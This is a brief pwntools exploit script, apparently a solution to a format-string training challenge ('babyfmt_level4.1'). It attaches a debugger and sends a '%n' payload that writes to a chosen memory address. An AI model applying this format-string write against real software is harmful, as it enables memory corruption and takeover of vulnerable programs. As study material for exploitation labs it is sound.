from pwn import * 

binary = './babyfmt_level4.1'

p = process(binary)

s = '''
b * printf
'''



gdb.attach(p, s)
p.sendline("%121c%30$n------\xe0\x40\x40\x00\x00\x00\x00\x00")




p.interactive()





